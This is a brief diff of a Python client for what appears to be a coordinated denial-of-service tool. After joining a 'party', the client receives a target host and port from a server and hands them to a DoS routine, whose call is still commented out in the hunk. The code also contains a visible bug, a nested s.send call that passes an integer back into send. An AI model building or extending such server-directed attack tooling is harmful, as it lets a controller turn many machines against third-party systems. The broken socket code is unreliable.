@@ -14,8 +14,11 @@ def join_party():
     conf = input("Enter Y/N :")
     s.send(s.send(conf.encode()))
     if(s.recv(1024).decode() == "Started"):
+        tar = (s.recv(1024).decode()).split(":")
+        target = tar[0]
+        tport = tar[1]
         #call Dos func !!
-        #dos.start_dos(thread)
+        #dos.start_dos(thread,target,tport)
         pass  
     else:
         print(s.recv(1024).decode())
